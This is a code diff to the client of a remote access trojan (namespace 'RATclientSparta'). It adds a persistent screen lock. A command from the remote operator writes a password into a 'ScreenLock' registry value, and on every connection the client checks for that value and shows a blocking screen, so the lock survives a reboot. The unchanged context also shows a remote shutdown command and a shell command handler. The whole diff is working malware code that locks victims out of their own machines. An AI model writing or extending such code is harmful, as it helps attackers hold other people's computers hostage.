@@ -11,6 +11,8 @@ using RATclientSparta.Server.Send;
 using RATclientSparta.Tools.Chat;
 using SpartaRATclient.Tools;
 using SpartaRATclient;
+using RATclientSparta.Setup.RegistryData;
+using RATclientSparta.Tools.Screen;
 
 namespace RATclientSparta.Server
 {
@@ -58,6 +60,10 @@ namespace RATclientSparta.Server
         {
             SendData Client = new SendData(this.SocketConnection, true);
 
+            //Feature that locks the computer, Its using registry, So it will work even after computer restart.
+            //If registry item called "ScreenLock" exist, then it will take its value(password) and open the Blocking GUI
+            ScreenBlock screenBlock = new ScreenBlock();
+            screenBlock.CheckIfLockRequired();
 
             while (ServerConnected)
             {
@@ -113,6 +119,9 @@ namespace RATclientSparta.Server
 
                         //Computer shutdown
                         case 14: Shell command = new Shell(); command.Run(@"shutdown /s /t 1"); break;
+
+                        //Creating registry value For the Screen lock in encoded password way
+                        case 24: RegistryCreate Item = new RegistryCreate(); Item.Create("ScreenLock", message.ToString()); screenBlock.CheckIfLockRequired(); break;
 
                             //CURRENTLY NOT IN USE
                             //BlindShell command running
